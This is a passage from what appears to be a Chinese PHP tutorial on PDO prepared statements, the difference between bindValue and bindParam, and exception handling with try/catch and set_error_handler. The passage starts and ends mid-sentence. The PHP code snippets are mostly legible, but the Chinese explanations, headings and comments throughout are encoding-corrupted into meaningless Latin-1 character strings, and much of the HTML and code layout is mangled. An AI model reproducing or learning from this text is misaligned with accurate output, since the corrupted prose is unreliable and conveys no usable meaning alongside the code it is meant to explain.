fromã€‚æˆåŠŸå¾—åˆ°ä¸€ä¸ªPDOStatementç±»å¯¹è±¡ï¼Œå¤±è´¥å¾—åˆ°ä¸€ä¸ªfalseï¼ˆæˆ–è€…å¼‚å¸¸é”™è¯¯ï¼‰</li><li>PDOStatement::bindParam()ï¼šç»‘å®šé¢„å¤„ç†æ‰€éœ€è¦çš„å‚æ•°ï¼Œåªèƒ½ç»‘å®šå˜é‡ï¼ˆå¼•ç”¨ä¼ é€’ï¼‰</li><li>PDOStatement::bindValue()ï¼šç»‘å®šé¢„å¤„ç†æ‰€éœ€è¦çš„å‚æ•°ï¼Œå¯ä»¥ç»‘å®šå€¼ï¼ˆå€¼ä¼ é€’ï¼‰</li><li>PDOStatement::execute()ï¼šæ‰§è¡Œé¢„å¤„ç†ï¼ŒæˆåŠŸè¿”å›trueï¼Œå¤±è´¥è¿”å›false</li></ul></li></ul><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€PDOå‘é€é¢„å¤„ç†æŒ‡ä»¤ï¼šå³åˆ©ç”¨PDO::prepare()æ–¹æ³•å°†è¦æ‰§è¡Œçš„SQLæŒ‡ä»¤å…ˆå‘é€ç»™æœåŠ¡å™¨ç¼–è¯‘</p><pre><code># å®ä¾‹åŒ–PDOå¯¹è±¡$drivers = array(    PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION);$pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2&apos;,&apos;root&apos;,&apos;root&apos;,$drivers);</code></pre><p>â€‹<br>â€‹    # å‘é€é¢„å¤„ç†æŒ‡ä»¤<br>â€‹    $pre_sql = â€œselect <em> from t_40â€;                # æ— æ•°æ®é¢„å¤„ç†æŒ‡ä»¤<br>â€‹    $pre_sql = â€œselect </em> from t_40 where id = ?â€;    # æœ‰å‚æ•°é¢„å¤„ç†æŒ‡ä»¤<br>â€‹    $pre_sql = â€œselect * from t_40 where id = :idâ€;    # PDOç‰¹å®šé¢„å¤„ç†å‚æ•°æŒ‡ä»¤ï¼ˆ: + å­—ç¬¦ä¸²ï¼‰ï¼Œæ›´æ˜ç¡®<br>â€‹    </p><pre><code># æ‰§è¡Œæœ€åä¸€æ¡é¢„å¤„ç†æŒ‡ä»¤ï¼šå³ä½¿ç”¨:idä½œä¸ºå‚æ•°çš„$stmt = $pdo-&gt;prepare($pre_sql);if(!$stmt) die(&apos;é¢„å¤„ç†æŒ‡ä»¤æ‰§è¡Œå¤±è´¥ï¼&apos;);</code></pre><p>2ã€ç»‘å®šé¢„å¤„ç†å‚æ•°ï¼šå¦‚æœé¢„å¤„ç†æœ¬èº«æ˜¯éœ€è¦æºå¸¦å‚æ•°çš„ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨PDOStatement::bindValue()/bindParam()è¿›è¡Œå‚æ•°ç»‘å®š</p><p><strong>PDOStatement::bandValue()</strong></p><pre><code># æ¥ä¸Šè¿°ä»£ç $stmt-&gt;bindValue(&apos;:id&apos;,1);            # ç›´æ¥ç»‘å®šæ•°å€¼$id = 2;$stmt-&gt;bindValue(&apos;:id&apos;,$id);        # ç»‘å®šå˜é‡æ•°æ®</code></pre><p><strong>æ³¨æ„</strong>ï¼šå¦‚æœåœ¨å‘é€é¢„å¤„ç†æŒ‡ä»¤çš„æ—¶å€™ï¼Œä½¿ç”¨çš„æ˜¯â€œ?â€ä½œä¸ºå ä½ç¬¦ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨è¿›è¡Œç»‘å®šæ•°æ®çš„æ—¶å€™ï¼Œæ˜¯æŒ‰ç…§é¡ºåºè¿›è¡Œç»‘å®šçš„ï¼Œèµ·å§‹ä½ç½®çš„å ä½ç¬¦åºå·ä¸º1ï¼Œå¦‚æœæœ‰å¤šä¸ªå ä½ç¬¦ï¼Œä¾æ¬¡ç±»æ¨</p><pre><code># é¢„å¤„ç†æŒ‡ä»¤ï¼šselect * from t_40 where id = ?$stmt-&gt;bindValue(1,$id);</code></pre><p><strong>PDOStatement::bindParam()</strong></p><pre><code># æ¥é¢„å¤„ç†æŒ‡ä»¤# $stmt-&gt;bindParam(&apos;:id&apos;,3);        # é”™è¯¯ï¼šä¸èƒ½ç»‘å®šå€¼ï¼Œå¼•ç”¨ä¼ é€’ï¼Œåªèƒ½æ˜¯å˜é‡$id = 4;$stmt-&gt;bindParam(&apos;:id&apos;,$id);        # å¿…é¡»æ˜¯ä¼ é€’å˜é‡    </code></pre><p>4ã€æ‰§è¡Œé¢„å¤„ç†ï¼šåˆ©ç”¨PDOStatement::execute()æ–¹æ³•</p><pre><code># æ¥ä¸Šè¿°ä»£ç $res = $stmt-&gt;execute();if(!$res) die(&apos;é¢„å¤„ç†æ‰§è¡Œå¤±è´¥ï¼&apos;);# å¦‚æœæ˜¯æŸ¥è¯¢ï¼Œæƒ³è¦å¾—åˆ°é¢„å¤„ç†æ‰§è¡Œçš„ç»“æœï¼Œè¿˜éœ€è¦ä½¿ç”¨PDOStatement::fetch()æ–¹æ³•è¿›è¡Œæ•°æ®è§£æ$row = $stmt-&gt;fetch(PDO::FETCH_ASSOC);</code></pre><blockquote><p>å°ç»“</p></blockquote><p>1ã€PDOé¢„å¤„ç†é™¤äº†æœ¬èº«å®ç°äº†MySQLçš„é¢„å¤„ç†ï¼Œè¿˜é¢å¤–ä¼˜åŒ–äº†å ä½ç¬¦ï¼šä½¿ç”¨: + åå­—ä½œä¸ºå ä½ç¬¦ï¼ˆæŸ¥çœ‹æ›´æ¸…æ™°ï¼‰</p><p>2ã€PDOåˆ©ç”¨äº†PDO::prepare()æ–¹æ³•å‘é€é¢„å¤„ç†SQLæŒ‡ä»¤ï¼ŒæˆåŠŸå¾—åˆ°PDOStatementå¯¹è±¡</p><p>3ã€PDOåˆ©ç”¨PDOStatement::bindValue()/bindParam()æ¥å®ç°é¢„å¤„ç†æ•°æ®ç»‘å®š</p><p>4ã€PDOåˆ©ç”¨PDOStatement::execute()æ¥å®ç°è°ƒç”¨é¢„å¤„ç†</p><p>5ã€å¦‚æœåˆ©ç”¨PDOé¢„å¤„ç†æ¥å®ç°æ•°æ®æŸ¥è¯¢ï¼Œé‚£ä¹ˆåœ¨æ‰§è¡Œå®Œæˆé¢„å¤„ç†ä¹‹åï¼Œè¿˜éœ€è¦è°ƒç”¨PDOStatement::fetch()æ–¹æ³•è·å–é¢„å¤„ç†å¾—åˆ°çš„æ•°æ®</p><h3 id="7ã€PDOé¢„å¤„ç†æ•°æ®ç»‘å®š"><a href="#7ã€PDOé¢„å¤„ç†æ•°æ®ç»‘å®š" class="headerlink" title="7ã€PDOé¢„å¤„ç†æ•°æ®ç»‘å®š"></a><strong>7ã€PDOé¢„å¤„ç†æ•°æ®ç»‘å®š</strong></h3><blockquote><p>ç›®æ ‡ï¼šæŒæ¡PDOå…³äºé¢„å¤„ç†å‚æ•°ç»‘å®šçš„å®ç°ï¼ŒæŒæ¡ä¸åŒç±»å‹æ•°æ®ç»‘å®šçš„å®é™…åŒºåˆ«</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>æ•°æ®ç»‘å®š</strong>ï¼šæ˜¯æŒ‡åœ¨è¿›è¡Œé¢„å¤„ç†æŒ‡ä»¤å®šä¹‰æ—¶ä½¿ç”¨äº†å ä½ç¬¦ï¼Œä¸ºäº†ä¿è¯åç»­æ‰§è¡Œé¢„å¤„ç†æ—¶èƒ½å¤Ÿæ­£ç¡®æ‰§è¡Œï¼Œå°†å®é™…æ•°æ®æ›¿æ¢å ä½ç¬¦çš„è¿‡ç¨‹</p><ul><li>æ•°æ®ç»‘å®šçš„æ–¹å¼åº”è¯¥ä¸å ä½ç¬¦æ–¹å¼å¯¹åº”</li><li>PDOStatement::execute()æ–¹æ³•æœ¬èº«å°±å¯ä»¥å®ç°æ•°æ®ä¼ é€’å’Œç»‘å®š</li><li>PDOStatement::bindValue()å’ŒbindParam()åœ¨å®é™…è¿ç”¨ä¸­æœ‰æ˜æ˜¾åŒºåˆ«</li></ul><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€åœ¨PDOä¸­ï¼Œexecuteæœ¬èº«æ˜¯å¯ä»¥ç›´æ¥è¿›è¡Œæ•°æ®ç»‘å®šçš„ï¼Œå³åœ¨å‚æ•°ä¸­å¢åŠ å¯¹åº”çš„å ä½ç¬¦æ•°æ®ï¼Œä»¥æ•°ç»„å½¢å¼ä¼ å…¥</p><pre><code># é¢„å¤„ç†å½¢å¼ä½¿ç”¨åŸå§‹å ä½ç¬¦ï¼Ÿ$stmt = $pdo-&gt;prepare(&apos;select * from t_40 where id = ?&apos;);$stmt-&gt;execute(array(10));        # arrayä»£è¡¨æ˜¯æ•°ç»„ï¼Œ10ä»£è¡¨æ˜¯æ›¿æ¢å€¼ï¼Œå¦‚æœæœ‰å¤šä¸ªå…ƒç´ ï¼Œé¡ºåºæ”¾å…¥å³å¯# é¢„å¤„ç†å½¢å¼ä½¿ç”¨PDOå ä½ç¬¦ï¼š+ åå­—$stmt = $pdo-&gt;prepare(&apos;select * from t_40 where id = :id&apos;);$stmt-&gt;execute(array(&apos;:id&apos; =&gt; 10));    # ä½¿ç”¨å ä½ç¬¦ä½œä¸ºæ•°ç»„å…ƒç´ ä¸‹æ ‡</code></pre><p>2ã€PDOStatement::bindValue()å’ŒPDOStatement::bindParam()åŒºåˆ«</p><ul><li>äºŒè€…éƒ½å¯ä»¥å®ç°å ä½ç¬¦çš„æ•°æ®ç»‘å®š</li><li>bindValue()ç»‘å®šæ•°æ®çš„æ–¹å¼çµæ´»ï¼Œå¯ä»¥æ˜¯å˜é‡ä¹Ÿå¯ä»¥æ˜¯æ•°æ®å¸¸é‡ï¼›è€ŒbindParam()åªèƒ½æ˜¯å˜é‡</li><li><p>å› ä¸ºbindParamç»‘å®šçš„æ˜¯å˜é‡ï¼ˆå¼•ç”¨ä¼ å€¼ï¼‰ï¼Œæ‰€ä»¥å¦‚æœè¢«ç»‘å®šçš„å˜é‡å‘ç”Ÿæ”¹å˜ï¼Œä¼šç›´æ¥å½±å“åç»­executeç»“æœ</p><p>$stmt = $pdo-&gt;prepare(â€˜select * from t_40 where id = :idâ€™);</p><p>$id = 1;<br>$stmt-&gt;bindValue(â€˜:idâ€™,$id);<br>for(;$id &lt; 10;$id++){</p><pre><code>$stmt-&gt;execute();$row = $stmt-&gt;fetch(PDO::FETCH_ASSOC);</code></pre><p>}</p><h1 id="ä¸Šè¿°æ‰€æœ‰ç»“æœ-rowéƒ½æ˜¯s-idä¸º1çš„æ•°æ®"><a href="#ä¸Šè¿°æ‰€æœ‰ç»“æœ-rowéƒ½æ˜¯s-idä¸º1çš„æ•°æ®" class="headerlink" title="ä¸Šè¿°æ‰€æœ‰ç»“æœ$rowéƒ½æ˜¯s_idä¸º1çš„æ•°æ®"></a>ä¸Šè¿°æ‰€æœ‰ç»“æœ$rowéƒ½æ˜¯s_idä¸º1çš„æ•°æ®</h1><p>$id = 1;<br>$stmt-&gt;bindParam(â€˜:idâ€™,$id);<br>for(;$id &lt; 10;$id++){</p><pre><code>$stmt-&gt;execute();$row = $stmt-&gt;fetch(PDO::FETCH_ASSOC);</code></pre><p>}</p><h1 id="ä¸Šè¿°æ‰€æœ‰ç»“æœ-rowæ˜¯s-idä»1-9çš„æ•°æ®"><a href="#ä¸Šè¿°æ‰€æœ‰ç»“æœ-rowæ˜¯s-idä»1-9çš„æ•°æ®" class="headerlink" title="ä¸Šè¿°æ‰€æœ‰ç»“æœ$rowæ˜¯s_idä»1-9çš„æ•°æ®"></a>ä¸Šè¿°æ‰€æœ‰ç»“æœ$rowæ˜¯s_idä»1-9çš„æ•°æ®</h1></li></ul><blockquote><p>å°ç»“</p></blockquote><p>1ã€PDOç»‘å®šé¢„å¤„ç†æ•°æ®çš„æ–¹å¼æœ‰å¤šé‡ï¼šPDOStatement::bindValue()/bindParam()/execute()</p><p>2ã€å¦‚æœæ•°æ®ç®€å•ä¸”ä¸éœ€è¦é‡å¤ï¼Œé‚£ä¹ˆä½¿ç”¨bindValue()/execute()éƒ½å¯ä»¥</p><p>3ã€å¦‚æœæ•°æ®æœ¬èº«æ˜¯å˜åŒ–çš„ï¼Œè€Œä¸”æ˜¯æœ‰è§„åˆ™ï¼ˆæ•°ç»„éå†å‡ºæ¥çš„ç»“æœï¼‰ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨bindParam()æ¥èŠ‚çœæ“ä½œ</p><h2 id="ä¸‰ã€-PDOå¼‚å¸¸"><a href="#ä¸‰ã€-PDOå¼‚å¸¸" class="headerlink" title="ä¸‰ã€ PDOå¼‚å¸¸"></a><strong>ä¸‰ã€ PDOå¼‚å¸¸</strong></h2><blockquote><p>å­¦ä¹ ç›®æ ‡ï¼šç†è§£å¼‚å¸¸çš„æ¦‚å¿µï¼ŒæŒæ¡å¼‚å¸¸å¤„ç†çš„æ–¹å¼ï¼ŒæŒæ¡PDOä¸­å¼‚å¸¸çš„å®é™…åº”ç”¨</p></blockquote><ul><li>å¼‚å¸¸æœºåˆ¶</li><li>PDOé”™è¯¯æœºåˆ¶</li><li>PDOExceptionå¼‚å¸¸å¤„ç†</li></ul><h3 id="1ã€å¼‚å¸¸æœºåˆ¶"><a href="#1ã€å¼‚å¸¸æœºåˆ¶" class="headerlink" title="1ã€å¼‚å¸¸æœºåˆ¶"></a><strong>1ã€å¼‚å¸¸æœºåˆ¶</strong></h3><blockquote><p>ç›®æ ‡ï¼šäº†è§£å¼‚å¸¸æ¦‚å¿µï¼ŒæŒæ¡å¼‚å¸¸çš„å®ç°æ¨¡å¼</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>å¼‚å¸¸æœºåˆ¶</strong>ï¼šExceptionï¼Œæ˜¯é¢å‘å¯¹è±¡ä¸­ä¸€ç§é”™è¯¯æ•æ‰æœºåˆ¶</p><ul><li><p>ç”¨æ¥æ•æ‰ä¸€äº›æ‰§è¡Œå±‚é¢çš„é—®é¢˜ï¼ˆè¯­æ³•é—®é¢˜ä¼šåœ¨ç¼–è¯‘æ—¶å°±å‡ºç°ï¼Œå¼€å‘å¯ä»¥é¿å…ï¼‰</p></li><li><p>é€šå¸¸æ˜¯å› ä¸ºä¸€äº›ä¸ç¡®å®šçš„å†…å®¹å¯¼è‡´ä»£ç æ— æ³•æ­£å¸¸è¿è¡Œï¼Œç„¶åæˆ‘ä»¬å¯ä»¥æŒ‰ç…§è®¾å®šçš„é€»è¾‘æ¥å¤„ç†è¿™äº›é—®é¢˜</p></li><li><p>å¼‚å¸¸æœºåˆ¶å…è®¸å¼€å‘è€…ä¸»åŠ¨å¤„ç†é”™è¯¯ï¼Œè€Œä¸æ˜¯è¢«åŠ¨çš„å¤„ç†é”™è¯¯</p></li><li><p>å¼‚å¸¸æœºåˆ¶æ˜¯é¢å‘å¯¹è±¡è¯­è¨€ä¸­ä¸€ç§ç¨‹åº¦çš„å¤„ç†é”™è¯¯çš„æ–¹å¼</p></li><li><p>phpæä¾›äº†ä¸€å¥—æˆç†Ÿçš„å¼‚å¸¸å¤„ç†æœºåˆ¶ï¼šExceptionç±»</p><ul><li>phpé»˜è®¤çš„æ˜¯è­¦å‘Šæ¨¡å¼ï¼šå³å‡ºé”™åç«‹å³æŠ¥é”™ç»™ç”¨æˆ·</li><li>phpæƒ³è¦ä½¿ç”¨å¼‚å¸¸æœºåˆ¶ï¼šéœ€è¦è§¦å‘å¼‚å¸¸æœºåˆ¶ï¼ˆset_error_handler(å›è°ƒå‡½æ•°)ï¼‰</li></ul></li><li><p>å¼‚å¸¸å¤„ç†è¯­æ³•</p><ul><li><p>æ•è·å¼‚å¸¸</p><p>try{</p><pre><code># å¯èƒ½å‡ºç°å¼‚å¸¸çš„ä»£ç </code></pre><p>}catch(Exception å¼‚å¸¸å¯¹è±¡){</p><pre><code># ä¸»åŠ¨å¤„ç†å¼‚å¸¸ï¼ˆé”™è¯¯ä¿¡æ¯åœ¨å¼‚å¸¸å¯¹è±¡ä¸­ï¼‰</code></pre><p>}</p></li><li><p>ä¸»åŠ¨æŠ›å‡ºå¼‚å¸¸</p><h1 id="æ ¹æ®é€»è¾‘åˆ¤å®šä¸»åŠ¨ç»ˆæ­¢ä»£ç æ‰§è¡Œ"><a href="#æ ¹æ®é€»è¾‘åˆ¤å®šä¸»åŠ¨ç»ˆæ­¢ä»£ç æ‰§è¡Œ" class="headerlink" title="æ ¹æ®é€»è¾‘åˆ¤å®šä¸»åŠ¨ç»ˆæ­¢ä»£ç æ‰§è¡Œ"></a>æ ¹æ®é€»è¾‘åˆ¤å®šä¸»åŠ¨ç»ˆæ­¢ä»£ç æ‰§è¡Œ</h1><p>throw new Exception();        # ä¸åŒçš„å¼‚å¸¸å¯ä»¥æœ‰ä¸åŒçš„ç±»</p></li><li><p>å¤„ç†å¼‚å¸¸ï¼šåœ¨catchä¸­ä¸»åŠ¨å¤„ç†å¼‚å¸¸ï¼Œä¼˜é›…çš„ç»™ç”¨æˆ·æç¤ºç»“æœ</p></li></ul></li></ul><blockquote><p>æ­¥éª¤</p></blockquote><p>1ã€ç¡®å®šä½¿ç”¨å¼‚å¸¸è¿›è¡Œé”™è¯¯å¤„ç†ï¼šè®¾ç½®å¼‚å¸¸å¤„ç†è§£å†³æ–¹æ¡ˆ</p><p>2ã€ç¡®å®šå¼‚å¸¸å¯èƒ½å‡ºç°çš„ç§ç±»ï¼Œæ˜ç¡®è¦ä½¿ç”¨çš„å¼‚å¸¸ç±»</p><p>3ã€æ˜ç¡®æœ‰å¯èƒ½å‡ºç°é”™è¯¯çš„ä»£ç ï¼šä½¿ç”¨tryå°†ä»£ç å—åŒ…è£¹</p><ul><li>å¿…è¦æ—¶åœ¨é‡Œé¢ä¸»åŠ¨æŠ›å‡ºå¼‚å¸¸</li></ul><p>4ã€æ•è·å¼‚å¸¸å¤„ç†å¼‚å¸¸ï¼Œåœ¨catchä¸­è·å–æŠ›å‡ºçš„å¼‚å¸¸å¯¹è±¡</p><ul><li>åœ¨catchå†…éƒ¨è¿›è¡Œé”™è¯¯å¤„ç†</li></ul><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€æ˜ç¡®å¯èƒ½å‡ºç°é”™è¯¯çš„ä»£ç ã€‚å¦‚ï¼š</p><pre><code>$res = 4 / 0;</code></pre><ul><li><p>ä¸Šè¿°ä»£ç åœ¨ç¼–è¯‘æ—¶ä¸å­˜åœ¨é—®é¢˜ï¼Œä½†æ˜¯åœ¨è¿è¡Œçš„æ—¶å€™å› ä¸ºè¢«é™¤æ•°ä¸º0ï¼Œæ‰€ä»¥ä¼šå‡ºç°é”™è¯¯ã€‚è€Œè¿™ä¸ªæ—¶å€™é»˜è®¤çš„ï¼Œå°±æ˜¯ç³»ç»Ÿæ— æ³•æ­£ç¡®æ‰§è¡Œï¼Œç«‹é©¬ç»™å‡ºé”™è¯¯ï¼ˆphpé»˜è®¤çš„è§„åˆ™ï¼‰ã€‚è¿™ç§é”™è¯¯ç›´æ¥ç»™å‡ºçš„æ–¹å¼ä¸å±äºå¼‚å¸¸æ•æ‰ï¼Œå¼‚å¸¸æ•æ‰éœ€è¦ç”¨åˆ°å¼‚å¸¸ç±»Exceptionç±»è¿›è¡Œæ•æ‰ï¼šä½¿ç”¨throw</p><h1 id="å¤–éƒ¨ä¼ å…¥æ•°æ®ï¼šä¸ç¡®å®š"><a href="#å¤–éƒ¨ä¼ å…¥æ•°æ®ï¼šä¸ç¡®å®š" class="headerlink" title="å¤–éƒ¨ä¼ å…¥æ•°æ®ï¼šä¸ç¡®å®š"></a>å¤–éƒ¨ä¼ å…¥æ•°æ®ï¼šä¸ç¡®å®š</h1><p>$n1 = 10;<br>$n2 = 5;</p><h1 id="è¦æ±‚-n1-n2"><a href="#è¦æ±‚-n1-n2" class="headerlink" title="è¦æ±‚$n1 / $n2"></a>è¦æ±‚$n1 / $n2</h1><p>if($n2 == 0){</p><pre><code># è¢«é™¤æ•°ä¸º0ï¼Œä¸èƒ½æ“ä½œï¼šæŠ›å‡ºå¼‚å¸¸throw new Exception(&apos;è¢«é™¤æ•°ä¸èƒ½ä¸º0ï¼&apos;);</code></pre><p>}</p><h1 id="æ²¡æœ‰é—®é¢˜ç»§ç»­æ‰§è¡Œ"><a href="#æ²¡æœ‰é—®é¢˜ç»§ç»­æ‰§è¡Œ" class="headerlink" title="æ²¡æœ‰é—®é¢˜ç»§ç»­æ‰§è¡Œ"></a>æ²¡æœ‰é—®é¢˜ç»§ç»­æ‰§è¡Œ</h1><p>$res = $n1 / $n2;</p></li><li><p>å¾ˆæ˜æ˜¾ï¼Œä½¿ç”¨é¢å‘å¯¹è±¡çš„æ–¹å¼ä¼šé¢å¤–å¢åŠ ä»£ç æ¥å®ç°é”™è¯¯å¤„ç†ã€‚ä½†æ˜¯åœ¨é¢å‘å¯¹è±¡ä¸­ï¼Œå¼‚å¸¸æœºåˆ¶é€šå¸¸å¾ˆæˆç†Ÿï¼Œå¹¶ä¸éœ€è¦å†™é¢å¤–å¾ˆå¤šçš„ä»£ç ï¼Œè€Œä¸”ç»å¤§éƒ¨åˆ†æ—¶é—´é‡Œï¼Œæˆ‘ä»¬å¹¶ä¸ä¼šå»å¤„ç†â€œä¸å¯èƒ½â€å‡ºç°é—®é¢˜çš„ä»£ç ã€‚</p></li></ul><p>2ã€å¯ä»¥å°†ä»£ç å—æ”¾åˆ°ä¸€ä¸ªä¼šè‡ªåŠ¨æ•è·é”™è¯¯çš„ä»£ç å—ä¸­æ¥å®ç°å¼‚å¸¸çš„å¤„ç†ã€‚å¼‚å¸¸æ•æ‰è¯­æ³•å¦‚ä¸‹ï¼š</p><pre><code># æ­£å¸¸ä¸ä¼šå‡ºé”™ä»£ç echo &apos;hello world&apos;;$n1 = $_GET[&apos;n1&apos;];$n2 = $_GET[&apos;n2&apos;];# å¯èƒ½å‡ºç°å¼‚å¸¸ä»£ç ï¼šä½¿ç”¨try{}è¿›è¡ŒåŒ…è£¹æ•æ‰try{    # ä»£ç çš„æ‰§è¡Œå…·æœ‰æœªçŸ¥æ€§ï¼šä½†æ˜¯ä»£ç æ²¡æœ‰è¯­æ³•é”™è¯¯    $res = $n1 / $n2;                    # äº§ç”Ÿé”™è¯¯å°±ä¼šäº§ç”Ÿä¸€ä¸ªExceptionç±»å¯¹è±¡ï¼Œæ•è·é”™è¯¯}catch(Exception $e){    # æ•è·åçš„å¤„ç†ä»£ç ï¼šå¦‚æœtryä¸­æ²¡æœ‰é—®é¢˜ï¼Œä¸ä¼šè¿›å…¥åˆ°catchå†…éƒ¨    # $eä¸­ä¿å­˜äº†$res = $n1 / $n2;ä¼šå‡ºç°çš„é”™è¯¯    die(&apos;å‡ºé”™äº†...&apos;);}</code></pre><p>3ã€ä»¥ä¸Šä»£ç åœ¨phpä¸­è¿è¡Œå³ä¾¿å‡ºé”™ä¹Ÿä¸ä¼šæ‰§è¡Œï¼ŒåŸå› æ˜¯ç³»ç»Ÿé»˜è®¤ä½¿ç”¨çš„è­¦å‘Šæ¨¡å¼ï¼Œå³æœ‰ä»»ä½•é—®é¢˜éƒ½æ˜¯ç›´æ¥æŠ¥é”™ã€‚å¦‚æœè¦å®ç°å¼‚å¸¸å¤„ç†ï¼Œå¿…é¡»å€ŸåŠ©äºç³»ç»Ÿæä¾›çš„set_error_handler(å›è°ƒå‡½æ•°)æ¥å‘ŠçŸ¥ç³»ç»Ÿæˆ‘ä»¬æƒ³é‡‡ç”¨çš„å¤„ç†æ¨¡å¼</p><pre><code>set_error_handler(function (){    throw new Exception(&apos;é”™è¯¯ï¼&apos;);});# ä¸Šè¿°æ–¹å¼ç­‰ä»·äºå…ˆå®šä¹‰å‡½æ•°åæ³¨å†Œfunction exception_handler(){    throw new Exception(&apos;é”™è¯¯&apos;);}set_error_handler(&apos;exception_handler&apos;);</code></pre><p>4ã€æœ‰äº†ä¸Šè¿°ä»£ç åœ¨é”™è¯¯å¤„ç†ä¹‹å‰ï¼Œé‚£ä¹ˆç³»ç»Ÿç¢°åˆ°é”™è¯¯ï¼Œå°±ä¼šè°ƒç”¨æˆ‘ä»¬å®šä¹‰çš„functionæ¥è¿›è¡Œé”™è¯¯å¤„ç†ï¼šå¤„ç†ä¹Ÿåˆ†ä¸¤ç§æ¨¡å¼ï¼šæœ‰tryå’Œæ²¡æœ‰try</p><pre><code># æ¥ä¸Šè¿°ä»£ç ï¼šæ²¡æœ‰try$res = 5 / 0;# é”™è¯¯ï¼šç›´æ¥æŠ¥é”™ï¼Œä½†æ˜¯å®é™…ä¸Šå·²ç»è°ƒç”¨äº†è‡ªå®šä¹‰é”™è¯¯å¤„ç†å‡½æ•°ï¼Œåªæ˜¯å¼‚å¸¸æ²¡æœ‰å¤„ç†ï¼Œç³»ç»Ÿå¤„ç†äº†# æœ‰tryï¼štryå’Œcatchä¸åˆ†å®¶try{    $res = 5 / 0;}catch(Exception $e){    die(&apos;é”™è¯¯ï¼šè¢«é™¤æ•°ä¸èƒ½ä¸º0&apos;)ï¼›}</code></pre><p>5ã€å¼‚å¸¸å¯¹è±¡$eåˆ°ç›®å‰ä¸ºæ­¢æ²¡æœ‰äº§ç”Ÿä»»ä½•ä½œç”¨ï¼Œå…¶å®Exceptionç±»ä¸­æœ‰å¾ˆå¤šçš„æ–¹æ³•å’Œå±æ€§ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬ç»Ÿä¸€è·å–é”™è¯¯ä¿¡æ¯çš„</p><p>[å¤–é“¾å›¾ç‰‡è½¬å­˜å¤±è´¥,æºç«™å¯èƒ½æœ‰é˜²ç›—é“¾æœºåˆ¶,å»ºè®®å°†å›¾ç‰‡ä¿å­˜ä¸‹æ¥ç›´æ¥ä¸Šä¼ (img-8KK0bkF6-1589898970685)(æ•ˆæœå›¾\å¼‚å¸¸ç±»Exception.png)]</p><p>å…·ä½“ä½¿ç”¨å¦‚ä¸‹</p><pre><code>try{    # å¯èƒ½å‡ºç°é—®é¢˜çš„ä»£ç å—}catch(Exception $e){    echo &apos;ä»£ç è¿è¡Œé”™è¯¯ï¼&lt;br/&gt;&apos;;    echo &apos;é”™è¯¯æ–‡ä»¶ä¸ºï¼š&apos; . $e-&gt;getFile() . &apos;&lt;br/&gt;&apos;;    echo &apos;é”™è¯¯è¡Œå·ä¸ºï¼š&apos; . $e-&gt;getLine() . &apos;&lt;br/&gt;&apos;;    echo &apos;é”™è¯¯æè¿°ä¸ºï¼š&apos; . $e-&gt;getMessage();    die();}</code></pre><p>6ã€æœ‰çš„æ—¶å€™ä»£ç å¦‚æœèµ°åˆ°äº†ä¸€ä¸ªâ€œæ­»èƒ¡åŒâ€ï¼Œå³ä»£ç æ‰§è¡Œæ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œä½†æ˜¯ä¸ç¬¦åˆæˆ‘ä»¬çš„é€»è¾‘ã€‚ä»¥å‰æˆ‘ä»¬æ˜¯è·³è½¬æç¤ºï¼Œç°åœ¨å¯ä»¥æŠ›å‡ºå¼‚å¸¸ï¼Œäº¤ç»™å¼‚å¸¸æ¥å¤„ç†ï¼šthrow new Exception();</p><pre><code>try{    if($n != 0){        $res = 10 / $n;    }else{        # ä¸šåŠ¡æ²¡æ³•å‘å±•äº†ï¼Œç›´æ¥æŠ›å‡ºå¼‚å¸¸        throw new Exception(&apos;è¢«é™¤æ•°ä¸èƒ½ä¸º0ï¼&apos;);    }}catch(Exception $e){    echo &apos;ä»£ç è¿è¡Œé”™è¯¯ï¼&lt;br/&gt;&apos;;    echo &apos;é”™è¯¯æ–‡ä»¶ä¸ºï¼š&apos; . $e-&gt;getFile() . &apos;&lt;br/&gt;&apos;;    echo &apos;é”™è¯¯è¡Œå·ä¸ºï¼š&apos; . $e-&gt;getLine() . &apos;&lt;br/&gt;&apos;;    echo &apos;é”™è¯¯æè¿°ä¸ºï¼š&apos; . $e-&gt;getMessage();    die();}</code></pre><blockquote><p>å°ç»“</p></blockquote><p>1ã€å¼‚å¸¸æ˜¯é¢å‘å¯¹è±¡ä¸­å¤„ç†é”™è¯¯çš„ä¸€ç§æ–¹å¼ï¼Œèƒ½å¤Ÿè®©æ•´ä½“ç”¨ä¸€ç§ç»Ÿä¸€çš„æ–¹å¼å¯¹å¤–å¤„ç†é”™è¯¯</p><p>2ã€å¼‚å¸¸æœºåˆ¶æ˜¯åˆ©ç”¨try{}catch(Exception $e){}æ¥è¿›è¡Œæ•æ‰å’Œå¤„ç†çš„ï¼ŒExceptionç±»æä¾›äº†å¾ˆå¤šæ–¹æ³•å¯ä»¥æ–¹ä¾¿è·å–å„ç§é”™è¯¯ç›¸å…³ä¿¡æ¯</p><p>3ã€phpé»˜è®¤æ˜¯è­¦å‘Šæ¨¡å¼ï¼ˆè¿˜æœ‰é™é»˜æ¨¡å¼å’Œå¼‚å¸¸æ¨¡å¼ï¼‰ï¼Œå³ç›´æ¥ç³»ç»Ÿç»™å‡ºé”™è¯¯ï¼Œå¦‚æœæƒ³ä½¿ç”¨å¼‚å¸¸å¤„ç†ï¼Œé‚£ä¹ˆå°±éœ€è¦è®¾ç½®é”™è¯¯å¼‚å¸¸æ¨¡å¼set_error_handler(å¼‚å¸¸å›è°ƒå‡½æ•°)æ¥å®ç°</p><p>4ã€å¼‚å¸¸æ¨¡å¼ä¸­ï¼Œå¿…é¡»ä½¿ç”¨try{}catch(){}æ‰ä¼šæ•æ‰å¼‚å¸¸ï¼Œå¦åˆ™åªä¼šç³»ç»Ÿæç¤ºï¼ˆå¦‚æœå› ä¸ºå¼‚å¸¸å¤„ç†ä»£ç å¤ªéº»çƒ¦ï¼Œå¯ä»¥å°†å¼‚å¸¸å¤„ç†ä»£ç 